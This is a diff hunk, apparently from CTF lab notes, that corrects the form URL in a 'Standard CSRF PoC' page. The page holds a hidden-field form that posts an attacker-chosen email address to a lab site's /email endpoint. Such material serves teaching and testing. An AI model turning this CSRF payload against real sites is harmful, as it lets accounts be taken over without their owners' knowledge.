@@ -27,7 +27,7 @@ Example:
   </head>
   <body>
     <h3>Standard CSRF PoC</h3>
-    <form action="<https://nnjftadt.eu1.ctfio.com/email>" method="post">
+    <form action="https://nnjftadt.eu1.ctfio.com/email" method="post">
       <input type="hidden" name="email" value="pawpaw@hacks.dev" />
       <input type="submit" value="Submit request" />
     </form>
